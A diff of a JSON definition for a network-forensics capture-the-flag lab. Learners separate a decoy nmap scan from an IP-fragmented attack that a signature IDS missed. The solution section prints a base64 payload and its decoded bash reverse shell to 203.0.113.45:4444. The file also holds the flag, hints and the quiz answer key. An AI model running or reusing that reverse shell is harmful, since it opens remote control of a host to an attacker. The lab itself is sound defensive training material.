@@ -1,169 +1,219 @@
 {
-  "title" : "CR-18 / Module 6 / N6b — Traffic Analysis CTF2",
-  "description" : "Analyse a packet capture alongside the IDS alert log it generated to determine how a second intruder bypassed signature-based detection. Recognise a decoy scan by the single MAC address behind its forged source IPs, locate the fragmented attack the IDS never alerted on, reassemble it, and decode an obfuscated reverse-shell payload. A short assessment then checks the key facts of the investigation.",
-  "prerequisites" : [ "Completion of Traffic Analysis CTF1 (N6a), or equivalent Wireshark/tshark experience", "Comfort with display filters, Follow TCP Stream, and IP fragment reassembly", "Understanding that a source IP can be forged but the sending MAC cannot" ],
-  "outcomes" : [ "Analyse fragmented and obfuscated network traffic to identify a real attack", "Correlate a packet capture with IDS alerts to separate genuine activity from decoys", "Reassemble and extract a payload from fragmented traffic", "Explain how fragmentation and decoys evade signature-based IDS detection" ],
-  "state" : "UNRELEASED",
-  "levels" : [ {
-    "title" : "Introduction level",
-    "level_type" : "INFO_LEVEL",
-    "order" : 0,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "content" : "Welcome to the second Traffic Analysis lab.\n\nAfter the earlier breach, Orion Retail deployed a signature-based intrusion detection system (IDS) on the server segment. Weeks later, a second intrusion succeeded anyway.\n\nYou have two pieces of evidence, both in `~/case/`:\n\n* `orion-ids.pcapng` — the full packet capture from the server segment\n* `fast.log` — the alerts the IDS raised during the same window\n\nThe IDS log looks busy — plenty of alerts. But an IDS only reports what its signatures recognise, and a careful attacker plans around exactly that. Your job is to work out what the IDS caught, what it did **not**, and recover what the real attacker actually delivered.\n\n**A few things to keep in mind**\n\n* The alerts in `fast.log` are noisy. Ask whether they represent the real threat or a distraction.\n* An attacker can forge the source IP of a packet, but not the hardware (MAC) address the packet physically leaves from.\n* Signature IDS inspects packets as they arrive. Consider what happens to a signature when a payload is broken into pieces that never appear together in a single packet.\n\nThis is an offline review — the LAN `172.20.30.0/24` no longer exists. All answers are case-sensitive."
-  }, {
-    "title" : "Get Access",
-    "level_type" : "ACCESS_LEVEL",
-    "order" : 1,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "passkey" : "start-analysis",
-    "cloud_content" : "In the topology panel on the right, right-click **pentester** and select **Open GUI In New Window**. Log in with username **user** and password **password123**.\n\nBoth evidence files are in `~/case/` (the `case` alias takes you there). Submit the passkey **start-analysis** to unlock the next level.",
-    "local_content" : "This sandbox has not been validated for local-only deployment."
-  }, {
-    "title" : "What The IDS Missed",
-    "level_type" : "TRAINING_LEVEL",
-    "order" : 2,
-    "estimated_duration" : 30,
-    "minimal_possible_solve_time" : 12,
-    "answer" : "ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}",
-    "answer_variable_name" : null,
-    "content" : "The IDS raised a wall of alerts, and every one of them names a scan against the server. Read `fast.log` and then check those alerts against the capture. The source IP addresses in the alerts differ, but look at the **MAC address** each of those packets was sent from — a spoofed IP does not change the network card behind it.\n\nOnce you understand that the alerts are a decoy, look for what the IDS did **not** report. Somewhere in the capture is a session to the admin service on port 8080 that raised no alert at all, because its payload was fragmented so that no single packet matched a signature. Let Wireshark reassemble those fragments, read the request, and decode what it carried.\n\nThe payload is a command the attacker sent. Recover and decode it. Inside the decoded command is the flag.\n\n**Getting started**\n\n* `cat ~/case/fast.log` — read what the IDS reported, and which hosts it blames.\n* In Wireshark, add **Source MAC** as a column and compare the alerted \"scanners\".\n* Cross-check the scanning IPs against ARP traffic \n* The fragmented attack is IP-fragmented; Wireshark reassembles it if **Reassemble fragmented IP datagrams** is enabled (Edit → Preferences → Protocols → IPv4, on by default).\n* Once Wireshark reassembles the fragments, look inside the HTTP request body — one of its parameters isn't encrypted, just encoded.\n\n**Objectives**\n\n* Recognize scan-decoy behavior: multiple spoofed source IPs sharing one real network interface.\n* Use ARP traffic as ground truth to tell a real host's MAC from an impersonated IP.\n* Reassemble IP-fragmented traffic to recover a payload that no single packet's signature matched.\n* Distinguish encoding from encryption, and decode a base64-carried payload.\n* Identify why a signature-based IDS can log heavy \"noise\" while missing the actual intrusion.\n* Prepare yourself for a 5-question multiple-choice assessment quiz in the next stage.\n\n\nSubmit the **flag** contained in the decoded payload.",
-    "solution" : "* **Read the alert log.** In a terminal: `cat ~/case/fast.log`. There are 16 alerts, all \"ET SCAN\" signatures, naming five source IPs — `172.20.30.13`, `.44`, `.66`, `.77`, `.91`. It looks like five machines scanning the server.\n\n* **Show the alerts are a decoy (Wireshark).** Open `~/case/orion-ids.pcapng`. In the display filter bar type `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.20.30.10` and press Enter. \n\n* In the packet detail pane expand **Ethernet II**, right-click the **Source** field and choose **Apply as Column** — every scan packet now shows its source MAC. All five source IPs carry the same MAC, `a0:36:9f:2e:83:51`. \n\n* Now change the filter to `arp.opcode == 1` and read the ARP requests near the start of the capture: `.13`, `.44`, `.77` and `.91` each announce a *different* MAC of their own. So four of the five IPs are forged nmap decoys, and the scan is really one host — `172.20.30.66`.\n\n  Same result on the command line:\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'tcp.flags.syn==1 && tcp.flags.ack==0 && ip.dst==172.20.30.10' -T fields -e ip.src -e eth.src | sort | uniq -c`\n\n* **Find what the IDS missed.** The alert log has no line for port 8080. Set the display filter to `http.request && tcp.port == 8080`. A single packet appears — a `POST /admin/upload.php` from `172.20.30.66` (frame 201). It only appears because Wireshark reassembled it: the request was sent as 40 tiny IP fragments, so no single packet ever held a signature-matching string.\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'http.request.method==POST && tcp.port==8080' -T fields -e ip.src -e http.request.uri`\n\n* **See the fragmentation (Wireshark).** Click frame 201 and expand **Internet Protocol Version 4** in the detail pane. At the bottom of that node is a line **[40 IPv4 Fragments (315 bytes): #162(8), #163(8), ...]** — expand it to see every 8-byte fragment that was stitched together, with **[Fragment count: 40]** and **[Reassembled IPv4 length: 315]**. (Reassembly is on by default; if that line is missing, enable **Edit -> Preferences -> Protocols -> IPv4 -> Reassemble fragmented IPv4 datagrams**.)\n\n* **Read and decode the payload.** Still on frame 201, expand **Hypertext Transfer Protocol -> HTML Form URL Encoded**; the form field `cmd` holds a long base64 string. Right-click the request and choose **Follow -> HTTP Stream** to copy it whole, or extract it directly:\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'http.request.method==POST' -T fields -e urlencoded-form.value`\n\n  Decode it:\n\n  `echo 'YmFzaCAtYyAnZXhwb3J0IFRBRz1PUklPTntmcjRnbTNudDNkX3A0eWwwNGRfM3Y0ZDNzXzFkc307IGJhc2ggLWkgPiYgL2Rldi90Y3AvMjAzLjAuMTEzLjQ1LzQ0NDQgMD4mMSc=' | base64 -d`\n\n  which yields:\n\n  `bash -c 'export TAG=ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}; bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'`\n\n  a reverse shell to `203.0.113.45:4444`. The flag is the `TAG` value.\n\n* **The lesson.** Two evasions in one intrusion: nmap decoys (`-D`) to drown the real source in IDS noise, and IP fragmentation (`-f`) to split the payload below the signature boundary. The IDS logged the harmless scan loudly and never saw the actual compromise.\n\n**Answer: `ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}`",
-    "solution_penalized" : true,
-    "hints" : [ {
-      "title" : "Look For The Silence",
-      "content" : "The log has no entry for port 8080. Filter http.request.method==POST && tcp.port==8080. The one POST you find was reassembled from IP fragments (ip.flags.mf==1 || ip.frag_offset>0) — that fragmentation is why no signature fired.",
-      "hint_penalty" : 10,
-      "order" : 1
-    }, {
-      "title" : "Decode What It Carried",
-      "content" : "The POST body has a `cmd` field in base64. Extract it (`urlencoded-form.value`) and pipe it to `base64 -d`. The flag is inside the decoded command.",
-      "hint_penalty" : 15,
-      "order" : 2
-    }, {
-      "title" : "The Alerts Are Bait",
-      "content" : "The IDS names five scanning IPs, but add Source MAC as a column: they all share one MAC. Four are forged nmap decoys. Compare with the ARP requests at the start of the capture to see which IPs really own which MAC.",
-      "hint_penalty" : 5,
-      "order" : 0
-    } ],
-    "incorrect_answer_limit" : 5,
-    "attachments" : [ ],
-    "max_score" : 60,
-    "variant_answers" : false,
-    "reference_solution" : [ ],
-    "mitre_techniques" : [ {
-      "technique_key" : "TA0043.T1595"
-    }, {
-      "technique_key" : "TA0005.T1030"
-    }, {
-      "technique_key" : "TA0005.T1027"
-    }, {
-      "technique_key" : "TA0011.T1071"
-    } ],
-    "expected_commands" : [ "wireshark", "tshark", "base64" ],
-    "commands_required" : false
-  }, {
-    "title" : "Incident Questions",
-    "level_type" : "ASSESSMENT_LEVEL",
-    "order" : 3,
-    "estimated_duration" : 10,
-    "minimal_possible_solve_time" : 4,
-    "questions" : [ {
-      "question_type" : "FFQ",
-      "text" : "What is the MAC address of the real attacker — the single hardware address shared by all the decoy source IPs? (lower case, colon-separated)",
-      "points" : 10,
-      "penalty" : 0,
-      "order" : 0,
-      "answer_required" : true,
-      "choices" : [ {
-        "text" : "a0:36:9f:2e:83:51",
-        "correct" : true,
-        "order" : 0
-      }, {
-        "text" : "A0:36:9F:2E:83:51",
-        "correct" : true,
-        "order" : 1
-      }, {
-        "text" : "a0369f2e8351",
-        "correct" : true,
-        "order" : 2
-      }, {
-        "text" : "A0369F2E8351",
-        "correct" : true,
-        "order" : 3
-      } ]
-    }, {
-      "question_type" : "FFQ",
-      "text" : "What is the IP address of the real attacker (the one of the five scanning IPs that genuinely owns that MAC)?",
-      "points" : 10,
-      "penalty" : 0,
-      "order" : 1,
-      "answer_required" : true,
-      "choices" : [ {
-        "text" : "172.20.30.66",
-        "correct" : true,
-        "order" : 0
-      } ]
-    }, {
-      "question_type" : "FFQ",
-      "text" : "On which TCP port did the real attack take place — the service the IDS never alerted on?",
-      "points" : 10,
-      "penalty" : 0,
-      "order" : 2,
-      "answer_required" : true,
-      "choices" : [ {
-        "text" : "8080",
-        "correct" : true,
-        "order" : 0
-      } ]
-    }, {
-      "question_type" : "MCQ",
-      "text" : "In one word, what technique split the malicious payload so that no single packet matched an IDS signature?",
-      "points" : 10,
-      "penalty" : 0,
-      "order" : 3,
-      "answer_required" : true,
-      "choices" : [ {
-        "text" : "Encryption",
-        "correct" : false,
-        "order" : 0
-      }, {
-        "text" : "fragmentation",
-        "correct" : true,
-        "order" : 1
-      }, {
-        "text" : "Tunnelling",
-        "correct" : false,
-        "order" : 2
-      }, {
-        "text" : "Obfuscation",
-        "correct" : false,
-        "order" : 3
-      } ]
-    }, {
-      "question_type" : "FFQ",
-      "text" : "What IP address would the recovered reverse shell have connected back to?",
-      "points" : 10,
-      "penalty" : 0,
-      "order" : 4,
-      "answer_required" : true,
-      "choices" : [ {
-        "text" : "203.0.113.45",
-        "correct" : true,
-        "order" : 0
-      } ]
-    } ],
-    "instructions" : "Answer from what you already found in the previous level — no new analysis is required. Every answer is a value you encountered while recovering the flag. Answers are case-sensitive; enter MAC addresses in lower case with colons.",
-    "assessment_type" : "TEST"
-  }, {
-    "title" : "Lab Completed",
-    "level_type" : "INFO_LEVEL",
-    "order" : 4,
-    "estimated_duration" : 0,
-    "minimal_possible_solve_time" : null,
-    "content" : "You've completed the second Traffic Analysis lab.\n\nThe IDS actually behaved exactly the way it was built to — and that’s why it missed the real attack. It checked each packet against its signature list one‑by‑one, so the noisy decoy scan filled the logs with alerts while the real attack, split into tiny fragments below the signature threshold, slipped through with no warnings at all.\n\nYou separated the two by looking past the forged source IPs and noticing that all the suspicious traffic shared the same MAC address. That led you to the quiet session the IDS ignored. Once you reassembled the fragments — the same way Wireshark automatically stitches them back together — you could decode the base64 payload, which turned out to be a reverse shell.\n\nThe takeaway for defence: signature-based detection is necessary but not sufficient. Fragmentation, decoys and payload obfuscation each defeat it in a different way, and an alert log that looks busy can still be blind to the one thing that mattered. Stream reassembly at the sensor, anomaly-based detection, and egress filtering that would have caught the reverse-shell callout are the kinds of control that close the gap. Head back to the LMS to continue the course."
-  } ],
-  "estimated_duration" : 40,
-  "variant_sandboxes" : false
+  "title": "CR-18 / Module 6 / N6b — Traffic Analysis CTF2",
+  "description": "Analyse a packet capture alongside the IDS alert log it generated to determine how a second intruder bypassed signature-based detection. Recognise a decoy scan by the single MAC address behind its forged source IPs, locate the fragmented attack the IDS never alerted on, reassemble it, and decode an obfuscated reverse-shell payload. A short assessment then checks the key facts of the investigation.",
+  "prerequisites": [
+    "Completion of Traffic Analysis CTF1 (N6a), or equivalent Wireshark/tshark experience",
+    "Comfort with display filters, Follow TCP Stream, and IP fragment reassembly",
+    "Understanding that a source IP can be forged but the sending MAC cannot"
+  ],
+  "outcomes": [
+    "Analyse fragmented and obfuscated network traffic to identify a real attack",
+    "Correlate a packet capture with IDS alerts to separate genuine activity from decoys",
+    "Reassemble and extract a payload from fragmented traffic",
+    "Explain how fragmentation and decoys evade signature-based IDS detection"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Introduction level",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "Welcome to the second Traffic Analysis lab.\n\nAfter the earlier breach, Orion Retail deployed a signature-based intrusion detection system (IDS) on the server segment. Weeks later, a second intrusion succeeded anyway.\n\nYou have two pieces of evidence, both in `~/case/`:\n\n* `orion-ids.pcapng` — the full packet capture from the server segment\n* `fast.log` — the alerts the IDS raised during the same window\n\nThe IDS log looks busy — plenty of alerts. But an IDS only reports what its signatures recognise, and a careful attacker plans around exactly that. Your job is to work out what the IDS caught, what it did **not**, and recover what the real attacker actually delivered.\n\n**A few things to keep in mind**\n\n* The alerts in `fast.log` are noisy. Ask whether they represent the real threat or a distraction.\n* An attacker can forge the source IP of a packet, but not the hardware (MAC) address the packet physically leaves from.\n* Signature IDS inspects packets as they arrive. Consider what happens to a signature when a payload is broken into pieces that never appear together in a single packet.\n\nThis is an offline review — the LAN `172.20.30.0/24` no longer exists. All answers are case-sensitive."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start-analysis",
+      "cloud_content": "In the topology panel on the right, right-click **pentester** and select **Open GUI In New Window**. Log in with username **user** and password **password123**.\n\nBoth evidence files are in `~/case/` (the `case` alias takes you there). Submit the passkey **start-analysis** to unlock the next level.",
+      "local_content": "This sandbox has not been validated for local-only deployment."
+    },
+    {
+      "title": "What The IDS Missed",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 30,
+      "minimal_possible_solve_time": 12,
+      "answer": "ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}",
+      "answer_variable_name": null,
+      "content": "The IDS raised a wall of alerts, and every one of them names a scan against the server. Read `fast.log` and then check those alerts against the capture. The source IP addresses in the alerts differ, but look at the **MAC address** each of those packets was sent from — a spoofed IP does not change the network card behind it.\n\nOnce you understand that the alerts are a decoy, look for what the IDS did **not** report. Somewhere in the capture is a session to the admin service on port 8080 that raised no alert at all, because its payload was fragmented so that no single packet matched a signature. Let Wireshark reassemble those fragments, read the request, and decode what it carried.\n\nThe payload is a command the attacker sent. Recover and decode it. Inside the decoded command is the flag.\n\n**Getting started**\n\n* `cat ~/case/fast.log` — read what the IDS reported, and which hosts it blames.\n* In Wireshark, add **Source MAC** as a column and compare the alerted \"scanners\".\n* Cross-check the scanning IPs against ARP traffic \n* The fragmented attack is IP-fragmented; Wireshark reassembles it if **Reassemble fragmented IP datagrams** is enabled (Edit → Preferences → Protocols → IPv4, on by default).\n* Once Wireshark reassembles the fragments, look inside the HTTP request body — one of its parameters isn't encrypted, just encoded.\n\n**Objectives**\n\n* Recognize scan-decoy behavior: multiple spoofed source IPs sharing one real network interface.\n* Use ARP traffic as ground truth to tell a real host's MAC from an impersonated IP.\n* Reassemble IP-fragmented traffic to recover a payload that no single packet's signature matched.\n* Distinguish encoding from encryption, and decode a base64-carried payload.\n* Identify why a signature-based IDS can log heavy \"noise\" while missing the actual intrusion.\n* Prepare yourself for a 5-question multiple-choice assessment quiz in the next stage.\n\n\nSubmit the **flag** contained in the decoded payload.",
+      "solution": "* **Read the alert log.** In a terminal: `cat ~/case/fast.log`. There are 16 alerts, all \"ET SCAN\" signatures, naming five source IPs — `172.20.30.13`, `.44`, `.66`, `.77`, `.91`. It looks like five machines scanning the server.\n\n* **Show the alerts are a decoy (Wireshark).** Open `~/case/orion-ids.pcapng`. In the display filter bar type `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.20.30.10` and press Enter. \n\n* In the packet detail pane expand **Ethernet II**, right-click the **Source** field and choose **Apply as Column** — every scan packet now shows its source MAC. All five source IPs carry the same MAC, `a0:36:9f:2e:83:51`. \n\n* Now change the filter to `arp.opcode == 1` and read the ARP requests near the start of the capture: `.13`, `.44`, `.77` and `.91` each announce a *different* MAC of their own. So four of the five IPs are forged nmap decoys, and the scan is really one host — `172.20.30.66`.\n\n  Same result on the command line:\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'tcp.flags.syn==1 && tcp.flags.ack==0 && ip.dst==172.20.30.10' -T fields -e ip.src -e eth.src | sort | uniq -c`\n\n* **Find what the IDS missed.** The alert log has no line for port 8080. Set the display filter to `http.request && tcp.port == 8080`. A single packet appears — a `POST /admin/upload.php` from `172.20.30.66` (frame 201). It only appears because Wireshark reassembled it: the request was sent as 40 tiny IP fragments, so no single packet ever held a signature-matching string.\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'http.request.method==POST && tcp.port==8080' -T fields -e ip.src -e http.request.uri`\n\n* **See the fragmentation (Wireshark).** Click frame 201 and expand **Internet Protocol Version 4** in the detail pane. At the bottom of that node is a line **[40 IPv4 Fragments (315 bytes): #162(8), #163(8), ...]** — expand it to see every 8-byte fragment that was stitched together, with **[Fragment count: 40]** and **[Reassembled IPv4 length: 315]**. (Reassembly is on by default; if that line is missing, enable **Edit -> Preferences -> Protocols -> IPv4 -> Reassemble fragmented IPv4 datagrams**.)\n\n* **Read and decode the payload.** Still on frame 201, expand **Hypertext Transfer Protocol -> HTML Form URL Encoded**; the form field `cmd` holds a long base64 string. Right-click the request and choose **Follow -> HTTP Stream** to copy it whole, or extract it directly:\n\n  `tshark -r ~/case/orion-ids.pcapng -Y 'http.request.method==POST' -T fields -e urlencoded-form.value`\n\n  Decode it:\n\n  `echo 'YmFzaCAtYyAnZXhwb3J0IFRBRz1PUklPTntmcjRnbTNudDNkX3A0eWwwNGRfM3Y0ZDNzXzFkc307IGJhc2ggLWkgPiYgL2Rldi90Y3AvMjAzLjAuMTEzLjQ1LzQ0NDQgMD4mMSc=' | base64 -d`\n\n  which yields:\n\n  `bash -c 'export TAG=ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}; bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'`\n\n  a reverse shell to `203.0.113.45:4444`. The flag is the `TAG` value.\n\n* **The lesson.** Two evasions in one intrusion: nmap decoys (`-D`) to drown the real source in IDS noise, and IP fragmentation (`-f`) to split the payload below the signature boundary. The IDS logged the harmless scan loudly and never saw the actual compromise.\n\n**Answer: `ORION{fr4gm3nt3d_p4yl04d_3v4d3s_1ds}`",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Look For The Silence",
+          "content": "The log has no entry for port 8080. Filter http.request.method==POST && tcp.port==8080. The one POST you find was reassembled from IP fragments (ip.flags.mf==1 || ip.frag_offset>0) — that fragmentation is why no signature fired.",
+          "hint_penalty": 13,
+          "order": 1
+        },
+        {
+          "title": "Decode What It Carried",
+          "content": "The POST body has a `cmd` field in base64. Extract it (`urlencoded-form.value`) and pipe it to `base64 -d`. The flag is inside the decoded command.",
+          "hint_penalty": 20,
+          "order": 2
+        },
+        {
+          "title": "The Alerts Are Bait",
+          "content": "The IDS names five scanning IPs, but add Source MAC as a column: they all share one MAC. Four are forged nmap decoys. Compare with the ARP requests at the start of the capture to see which IPs really own which MAC.",
+          "hint_penalty": 7,
+          "order": 0
+        }
+      ],
+      "incorrect_answer_limit": 5,
+      "attachments": [],
+      "max_score": 80,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0043.T1595"
+        },
+        {
+          "technique_key": "TA0005.T1030"
+        },
+        {
+          "technique_key": "TA0005.T1027"
+        },
+        {
+          "technique_key": "TA0011.T1071"
+        }
+      ],
+      "expected_commands": [
+        "wireshark",
+        "tshark",
+        "base64"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Incident Questions",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 4,
+      "questions": [
+        {
+          "question_type": "FFQ",
+          "text": "What is the MAC address of the real attacker — the single hardware address shared by all the decoy source IPs? (lower case, colon-separated)",
+          "points": 10,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "a0:36:9f:2e:83:51",
+              "correct": true,
+              "order": 0
+            },
+            {
+              "text": "A0:36:9F:2E:83:51",
+              "correct": true,
+              "order": 1
+            },
+            {
+              "text": "a0369f2e8351",
+              "correct": true,
+              "order": 2
+            },
+            {
+              "text": "A0369F2E8351",
+              "correct": true,
+              "order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What is the IP address of the real attacker (the one of the five scanning IPs that genuinely owns that MAC)?",
+          "points": 10,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "172.20.30.66",
+              "correct": true,
+              "order": 0
+            }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "On which TCP port did the real attack take place — the service the IDS never alerted on?",
+          "points": 10,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "8080",
+              "correct": true,
+              "order": 0
+            }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "In one word, what technique split the malicious payload so that no single packet matched an IDS signature?",
+          "points": 10,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "Encryption",
+              "correct": false,
+              "order": 0
+            },
+            {
+              "text": "fragmentation",
+              "correct": true,
+              "order": 1
+            },
+            {
+              "text": "Tunnelling",
+              "correct": false,
+              "order": 2
+            },
+            {
+              "text": "Obfuscation",
+              "correct": false,
+              "order": 3
+            }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What IP address would the recovered reverse shell have connected back to?",
+          "points": 10,
+          "penalty": 0,
+          "order": 4,
+          "answer_required": true,
+          "choices": [
+            {
+              "text": "203.0.113.45",
+              "correct": true,
+              "order": 0
+            }
+          ]
+        }
+      ],
+      "instructions": "Answer from what you already found in the previous level — no new analysis is required. Every answer is a value you encountered while recovering the flag. Answers are case-sensitive; enter MAC addresses in lower case with colons.",
+      "assessment_type": "TEST"
+    },
+    {
+      "title": "Lab Completed",
+      "level_type": "INFO_LEVEL",
+      "order": 4,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "You've completed the second Traffic Analysis lab.\n\nThe IDS actually behaved exactly the way it was built to — and that’s why it missed the real attack. It checked each packet against its signature list one‑by‑one, so the noisy decoy scan filled the logs with alerts while the real attack, split into tiny fragments below the signature threshold, slipped through with no warnings at all.\n\nYou separated the two by looking past the forged source IPs and noticing that all the suspicious traffic shared the same MAC address. That led you to the quiet session the IDS ignored. Once you reassembled the fragments — the same way Wireshark automatically stitches them back together — you could decode the base64 payload, which turned out to be a reverse shell.\n\nThe takeaway for defence: signature-based detection is necessary but not sufficient. Fragmentation, decoys and payload obfuscation each defeat it in a different way, and an alert log that looks busy can still be blind to the one thing that mattered. Stream reassembly at the sensor, anomaly-based detection, and egress filtering that would have caught the reverse-shell callout are the kinds of control that close the gap. Head back to the LMS to continue the course."
+    }
+  ],
+  "estimated_duration": 40,
+  "variant_sandboxes": false
 }
